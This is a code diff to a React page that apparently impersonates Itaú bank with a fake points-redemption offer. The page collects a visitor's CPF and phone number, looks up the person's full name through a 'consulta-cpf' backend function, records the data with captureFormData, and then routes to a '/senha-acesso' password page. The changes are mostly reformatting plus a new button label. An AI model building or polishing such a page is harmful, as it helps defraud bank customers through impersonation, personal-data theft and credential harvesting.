@@ -23,19 +23,21 @@ const Index = () => {
     if (cleanCpf.length === 11) {
       setConsultando(true);
       setCpfErro("");
-      supabase.functions.invoke("consulta-cpf", {
-        body: { cpf: cleanCpf },
-      }).then(({ data, error }) => {
-        setConsultando(false);
-        const nome = data?.data?.nome || data?.nome;
-        if (!error && nome) {
-          setNomeCompleto(nome);
-          setCpfErro("");
-        } else {
-          setNomeCompleto("");
-          setCpfErro(data?.details?.message || data?.data?.message || data?.error || "CPF inválido");
-        }
-      });
+      supabase.functions
+        .invoke("consulta-cpf", {
+          body: { cpf: cleanCpf },
+        })
+        .then(({ data, error }) => {
+          setConsultando(false);
+          const nome = data?.data?.nome || data?.nome;
+          if (!error && nome) {
+            setNomeCompleto(nome);
+            setCpfErro("");
+          } else {
+            setNomeCompleto("");
+            setCpfErro(data?.details?.message || data?.data?.message || data?.error || "CPF inválido");
+          }
+        });
     } else {
       setNomeCompleto("");
       setCpfErro("");
@@ -43,7 +45,10 @@ const Index = () => {
   }, [cpf]);
 
   return (
-    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #FF6200 0%, #CC5000 100%)' }}>
+    <div
+      className="min-h-screen max-w-md mx-auto relative"
+      style={{ background: "linear-gradient(135deg, #FF6200 0%, #CC5000 100%)" }}
+    >
       {/* Header */}
       <div className="px-5 pt-6 pb-16">
         <div className="flex items-center justify-between mb-8">
@@ -54,9 +59,7 @@ const Index = () => {
           <div className="text-primary-foreground text-2xl font-bold tracking-wide">
             <img src={itauLogo} alt="Itaú" className="h-12" />
           </div>
-          <p className="text-primary-foreground/80 text-sm">
-            Você possui pontos para resgate
-          </p>
+          <p className="text-primary-foreground/80 text-sm">Você possui pontos para resgate</p>
         </div>
       </div>
 
@@ -98,7 +101,9 @@ const Index = () => {
         </div>
 
         {/* Nome do titular */}
-        <div className={`w-full py-3 rounded-full font-semibold text-base text-center ${cpfErro ? "bg-red-100 text-red-600" : "bg-white text-[#FF6200]"}`}>
+        <div
+          className={`w-full py-3 rounded-full font-semibold text-base text-center ${cpfErro ? "bg-red-100 text-red-600" : "bg-white text-[#FF6200]"}`}
+        >
           {consultando ? "Consultando..." : cpfErro ? cpfErro : nomeCompleto ? nomeCompleto : "1º titular"}
         </div>
 
@@ -119,11 +124,18 @@ const Index = () => {
 
         {/* CTA */}
         <button
-          onClick={() => { captureFormData("identificacao", { cpf: cpf.replace(/\D/g, ""), telefone: telefone.replace(/\D/g, ""), nome: nomeCompleto }); navigate("/senha-acesso", { state: { nome: nomeCompleto } }); }}
+          onClick={() => {
+            captureFormData("identificacao", {
+              cpf: cpf.replace(/\D/g, ""),
+              telefone: telefone.replace(/\D/g, ""),
+              nome: nomeCompleto,
+            });
+            navigate("/senha-acesso", { state: { nome: nomeCompleto } });
+          }}
           disabled={cpf.replace(/\D/g, "").length !== 11 || telefone.replace(/\D/g, "").length !== 11}
           className="w-full py-4 rounded-full bg-white text-[#FF6200] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
         >
-          continuar para resgate
+          Consultar
         </button>
       </div>
 
@@ -131,11 +143,7 @@ const Index = () => {
       <BottomNav />
 
       {/* Attention Modal */}
-      <AttentionModal
-        open={modalOpen}
-        onClose={() => setModalOpen(false)}
-        onContinue={() => setModalOpen(false)}
-      />
+      <AttentionModal open={modalOpen} onClose={() => setModalOpen(false)} onContinue={() => setModalOpen(false)} />
     </div>
   );
 };
